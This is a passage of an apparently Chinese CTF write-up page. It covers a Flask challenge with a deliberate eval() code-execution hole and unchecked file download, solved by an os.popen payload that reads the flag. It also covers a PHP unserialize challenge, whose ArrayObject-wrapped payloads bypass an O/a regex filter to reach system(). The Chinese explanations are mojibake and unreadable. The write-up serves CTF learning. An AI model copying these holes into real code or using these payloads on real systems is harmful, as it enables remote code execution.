</span></span><span class="line"><span class="cl">            <span class="n">session</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">][</span><span class="s1">&#39;role&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;profile&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">msg</span> <span class="o">=</span> <span class="s1">&#39;Incorrect username/password!&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;login2.html&#39;</span><span class="p">,</span> <span class="n">msg</span> <span class="o">=</span> <span class="n">msg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/register/&#39;</span><span class="p">,</span> <span class="n">methods</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">msg</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span> <span class="ow">and</span> <span class="s1">&#39;username&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span> <span class="ow">and</span> <span class="s1">&#39;password&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">msg</span> <span class="o">=</span> <span class="s1">&#39;Account already exists!&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span> <span class="s1">&#39;role&#39;</span><span class="p">:</span> <span class="s1">&#39;user&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">msg</span> <span class="o">=</span> <span class="s1">&#39;You have successfully registered!&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;register2.html&#39;</span><span class="p">,</span> <span class="n">msg</span> <span class="o">=</span> <span class="n">msg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/profile/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">profile</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;loggedin&#39;</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;profile2.html&#39;</span><span class="p">,</span> <span class="n">username</span> <span class="o">=</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">],</span> <span class="n">role</span><span class="o">=</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/show/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;loggedin&#39;</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;show2.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/download/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">download</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;loggedin&#39;</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;filename&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;filename&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">as_attachment</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/hello/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hello_world</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;eval&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;hello,</span><span class="si">{</span><span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;hello&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/logout/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;loggedin&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;role&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="mi">8080</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="2payload">2.payload</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">URL+/hello/?eval=__import__(&#34;os&#34;).popen(&#34;cat /flag_is_h3re&#34;).read()
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="easy_php">easy_php</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ctfshow</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;not allowed!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ctfshow</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;1+1&gt;2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^[Oa]:[\d]+/i&#34;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 id="1È¢òÁõÆÂàÜÊûê">1.È¢òÁõÆÂàÜÊûê</h4>
<p>Âè™Ë¶ÅÊâßË°å<code>__destruct()</code>‰∏≠ÁöÑ<code>system</code>ÂáΩÊï∞ÔºåÁªô<code>ctfshow</code>ËµãÂÄºÂç≥ÂèØ</p>
<p>‰ΩÜÊòØÂØπdataËøõË°å‰∫ÜËøáÊª§Ôºå‰∏çËÉΩ‰º†ÂÖ•‰ª•OÂíåaÂºÄÂ§¥ÁöÑÂ∫èÂàóÂåñÂÄº,‰πüÂ∞±ÊòØÂØπË±°ÂíåÊï∞ÁªÑÁöÑÂ∫èÂàóÂåñÂÄº„ÄÇ</p>
<p>ÊÑüËßâËøô‰∏™È¢òÁöÑÈöæÁÇπÔºåÂ∞±ÊòØ‰∏çÂ§™‰ºöÁªïËøáOaÔºå</p>
<p>È¢òÁõÆ‰∏≠ÁöÑctfshowÁ±ªÊú™ÂÆûÁé∞serializableÊé•Âè£ÔºåÊâÄ‰ª•‰∏çËÉΩËß£ÊûêËØ•Â±ûÊÄß„ÄÇÊâÄ‰ª•Êâæphp‰∏≠ÂÜÖÁΩÆÁöÑÂÆûÁé∞‰∫ÜSerializableÊé•Âè£ÁöÑÁ±ª</p>
<p>wp‰ΩøÁî®‰∫ÜArrayObject()Á±ªÔºå‰ΩøÁî®Ëøô‰∏™Á±ªÂéª‰øÆÈ•∞ctfshowÁ±ª</p>
<h4 id="2Áü•ËØÜÁÇπ-2">2.Áü•ËØÜÁÇπ</h4>
<ul>
<li>
<h5 id="oÊ†áËØÜÁ¨¶‰ª£Ë°®ÂØπË±°Á±ªÂûãËÄåcÊ†áËØÜÁ¨¶‰ª£Ë°®Á±ªÂêçÁ±ªÂûãÂ¶ÇÊûúÂ∞ÜoÊõøÊç¢‰∏∫cÂàôÂú®ÂèçÂ∫èÂàóÂåñÊó∂‰ºöÂ∞ÜÂÖ∂Ëß£Èáä‰∏∫‰∏Ä‰∏™Êñ∞ÁöÑÁ±ªÂêçÂ≠óÁ¨¶‰∏≤‰ªéËÄåÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑÁ±ªËÄå‰∏çÊòØÂØπË±°Âõ†‰∏∫Ëøô‰∏™Êñ∞ÁöÑÁ±ªÊ≤°ÊúâË¢´Â∫èÂàóÂåñËøáÊâÄ‰ª•ÂÆÉÊ≤°Êúâ‰ªª‰ΩïÂ±ûÊÄßÊàñÊñπÊ≥ïÂõ†Ê≠§Âú®ÂèçÂ∫èÂàóÂåñÊó∂__wakeupÁ≠â‰∏Ä‰∫õÈ≠îÊúØÊñπÊ≥ïÂ∞±‰∏ç‰ºöË¢´Ëá™Âä®Ë∞ÉÁî®‰ΩÜÊòØÂèØ‰ª•Âà©Áî®ÊúâÊé•Âè£serializableÁöÑÁ±ªÊù•ËøõË°å‰øÆÈ•∞‰ªéËÄåÂèØ‰ª•Âà©Áî®È≠îÊúØÊñπÊ≥ïÊØîÂ¶ÇarrayobjectÁ±ª">OÊ†áËØÜÁ¨¶‰ª£Ë°®ÂØπË±°Á±ªÂûãÔºåËÄåCÊ†áËØÜÁ¨¶‰ª£Ë°®Á±ªÂêçÁ±ªÂûã„ÄÇÂ¶ÇÊûúÂ∞ÜOÊõøÊç¢‰∏∫CÔºåÂàôÂú®ÂèçÂ∫èÂàóÂåñÊó∂‰ºöÂ∞ÜÂÖ∂Ëß£Èáä‰∏∫‰∏Ä‰∏™Êñ∞ÁöÑÁ±ªÂêçÂ≠óÁ¨¶‰∏≤Ôºå‰ªéËÄåÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑÁ±ªËÄå‰∏çÊòØÂØπË±°„ÄÇÂõ†‰∏∫Ëøô‰∏™Êñ∞ÁöÑÁ±ªÊ≤°ÊúâË¢´Â∫èÂàóÂåñËøáÔºåÊâÄ‰ª•ÂÆÉÊ≤°Êúâ‰ªª‰ΩïÂ±ûÊÄßÊàñÊñπÊ≥ï„ÄÇÂõ†Ê≠§Âú®ÂèçÂ∫èÂàóÂåñÊó∂Ôºå__wakeupÁ≠â‰∏Ä‰∫õÈ≠îÊúØÊñπÊ≥ïÂ∞±‰∏ç‰ºöË¢´Ëá™Âä®Ë∞ÉÁî®„ÄÇ‰ΩÜÊòØÂèØ‰ª•Âà©Áî®ÊúâÊé•Âè£SerializableÁöÑÁ±ªÔºåÊù•ËøõË°å‰øÆÈ•∞Ôºå‰ªéËÄåÂèØ‰ª•Âà©Áî®È≠îÊúØÊñπÊ≥ï„ÄÇÊØîÂ¶ÇArrayObjectÁ±ª„ÄÇ</h5>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">O:6:&#34;Person&#34;:2:{s:3:&#34;age&#34;;i:18;s:4:&#34;name&#34;;s:3:&#34;lxy&#34;;}
</span></span><span class="line"><span class="cl">‚ÄúO‚ÄùÔºöÂØπË±°
</span></span><span class="line"><span class="cl">‚Äú6‚ÄùÔºöÂØπË±°ÁöÑÁ±ªÂêçÈïøÂ∫¶
</span></span><span class="line"><span class="cl">‚ÄúPerson‚ÄùÔºöÂØπË±°Âêç
</span></span><span class="line"><span class="cl">‚Äú2‚ÄùÔºöÂØπË±°‰∏≠Êúâ2‰∏™ÂèòÈáè„ÄÇ
</span></span><span class="line"><span class="cl">s:4:&#34;name&#34;;s:3:&#34;lxy&#34;Ôºö
</span></span><span class="line"><span class="cl">‚Äús‚ÄùÔºöÂèòÈáèÁ±ªÂûãÔºå‰∏∫stringÂØπË±°Ôºõs:4:&#34;name&#34;ÔºöÂèòÈáèÂêçÈïøÂ∫¶ÂíåÂèòÈáèÂêçÔºå
</span></span><span class="line"><span class="cl">s:3:&#34;lxy&#34;ÔºöÂèòÈáèÁöÑÂÄºÂíåÂÄºÁöÑÈïøÂ∫¶„ÄÇ
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>
<h5 id="Âú®php‰ΩéÁâàÊú¨‰∏≠oÊàñaÁöÑÂÜíÂè∑ÂêéÁöÑÊï∞Â≠óÂâçÂèØ‰ª•Âä†‰∏Ä‰∏™Êù•ËøõË°åÁªïËøáÈ¢òÁõÆÁâàÊú¨73Êó†Ê≥ïÁªïËøá">Âú®php‰ΩéÁâàÊú¨‰∏≠ÔºåOÊàñaÁöÑÂÜíÂè∑ÂêéÁöÑÊï∞Â≠óÂâçÂèØ‰ª•Âä†‰∏Ä‰∏™+Êù•ËøõË°åÁªïËøáÔºåÈ¢òÁõÆÁâàÊú¨7.3Êó†Ê≥ïÁªïËøá„ÄÇ</h5>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:11:&#34;ArrayObject&#34;:37:{x:i:0;a:2:{i:0;i:0;i:1;i:1;};m:a:0:{}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">37ÔºöÊã¨Âè∑ÂÜÖÁöÑÂ≠óÁ¨¶Êï∞
</span></span><span class="line"><span class="cl">x:i:0;ÔºöÁªìÊûÑ‰∏≠ÁöÑnr_flagsÂ≠óÊÆµ
</span></span><span class="line"><span class="cl">a:2:{i:0;i:0;i:1;i:1;}ÔºöÁªìÊûÑ‰∏≠ÁöÑÊï∞ÁªÑÂ≠óÊÆµ(‰ªéËøô‰∏™ËßíÂ∫¶,ÂÆÉË¢´Áß∞‰∏∫internalÊï∞ÁªÑ‰ª•Âå∫Âà´‰∫éÂØπË±°Êú¨Ë∫´)
</span></span><span class="line"><span class="cl">m:a:0:{}Ôºözend_object stdÂ≠óÊÆµÂÜÖÁöÑpropertiesÂ≠óÊÆµ(‰ªéËøô‰∏™ËßíÂ∫¶,Áß∞‰∏∫membersÊï∞ÁªÑ)„ÄÇ
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="3payload-3">3.payload</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1"># payload1:ÂÆòÊñπ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="mi">1</span><span class="o">%</span><span class="mi">2</span><span class="nx">b1</span><span class="o">&gt;</span><span class="mi">2</span><span class="o">=</span><span class="nx">C</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span><span class="s2">&#34;ArrayObject&#34;</span><span class="o">:</span><span class="mi">67</span><span class="o">:</span><span class="p">{</span><span class="nx">x</span><span class="o">:</span><span class="nx">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="nx">O</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">&#34;ctfshow&#34;</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">&#34;ctfshow&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">12</span><span class="o">:</span><span class="s2">&#34;cat /f1agaaa&#34;</span><span class="p">;};</span><span class="nx">m</span><span class="o">:</span><span class="nx">a</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="p">{}}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># payload2:
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="mi">1</span><span class="o">%</span><span class="mi">2</span><span class="nx">b1</span><span class="o">&gt;</span><span class="mi">2</span><span class="o">=</span><span class="nx">C</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span><span class="s2">&#34;ArrayObject&#34;</span><span class="o">:</span><span class="mi">87</span><span class="o">:</span><span class="p">{</span><span class="nx">x</span><span class="o">:</span><span class="nx">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="nx">a</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">&#34;ctfshow&#34;</span><span class="p">;</span><span class="nx">O</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">&#34;ctfshow&#34;</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">&#34;ctfshow&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">12</span><span class="o">:</span><span class="s2">&#34;cat /f1agaaa&#34;</span><span class="p">;}};</span><span class="nx">m</span><span class="o">:</span><span class="nx">a</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="p">{}}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ctfshow</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">public</span> <span class="nv">$ctfshow</span> <span class="o">=</span> <span class="s1">&#39;cat /f1agaaa&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$ctfshow_obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctfshow</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$array_obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayObject</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$array_obj</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$ctfshow_obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$serialized_str</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$array_obj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$serialized_str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// C:11:&#34;ArrayObject&#34;:87:{x:i:0;a:1:{s:7:&#34;ctfshow&#34;;O:7:&#34;ctfshow&#34;:1:{s:7:&#34;ctfshow&#34;;s:12:&#34;cat /f1agaaa&#34;;}};m:a:0:{}}
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// È¶ñÂÖàÔºåÂÆö‰πâ‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ ctfshow ÁöÑÁ±ªÔºåÂπ∂Âú®ÂÖ∂‰∏≠ÂÆö‰πâ‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ ctfshow ÁöÑÂÖ¨ÂÖ±Â±ûÊÄßÔºåÂÖ∂ÂÄº‰∏∫cat /f1agaaa„ÄÇÁÑ∂ÂêéÔºåÂÆû‰æãÂåñ ctfshow Á±ªÔºåÂ∞ÜÂÖ∂ËµãÂÄºÁªô $array_obj ÂØπË±°ÁöÑ ctfshow Â±ûÊÄß„ÄÇ
</span></span></span><span class="line"><span class="cl"><span class="c1">// Ê≥®ÊÑèÔºåÂõ†‰∏∫ $array_obj ÊòØ‰∏Ä‰∏™ ArrayObject ÂØπË±°ÔºåÊâÄ‰ª•ÈúÄË¶Å‰ΩøÁî®Êï∞ÁªÑÁöÑÂΩ¢ÂºèÊù•ËµãÂÄºÔºåÂç≥ $array_obj[&#39;ctfshow&#39;]„ÄÇ
</span></span></span><span class="line"><span class="cl"><span class="c1">// ÊúÄÂêéÔºå‰ΩøÁî® serialize() ÂáΩÊï∞Â∞Ü $array_obj Â∫èÂàóÂåñ‰∏∫Â≠óÁ¨¶‰∏≤ÔºåÂπ∂Â∞ÜÂÖ∂ËæìÂá∫„ÄÇ
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="easy_class">easy_class</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
